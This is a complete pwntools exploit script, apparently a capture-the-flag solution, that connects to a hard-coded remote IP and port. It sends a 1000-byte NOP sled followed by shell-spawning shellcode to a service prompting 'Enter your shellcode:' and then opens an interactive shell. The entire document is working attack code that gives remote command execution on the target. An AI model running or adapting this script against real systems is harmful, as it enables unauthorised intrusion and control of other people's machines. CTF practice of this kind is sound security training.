```python
#!/usr/bin/env python3

from pwn import *

context.binary   = elf = ELF('./vuln')
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'info'

# p = process(elf.path)
p = remote('34.125.199.248', 1234)
# gdb.attach(p, gdbscript='''
# b *0x0804898b
# c
# ''')

nopsled = asm('nop') * 1000
shellcode = asm(shellcraft.sh())
payload = nopsled + shellcode

p.sendlineafter('Enter your shellcode:', payload)

p.interactive()
p.close()
```
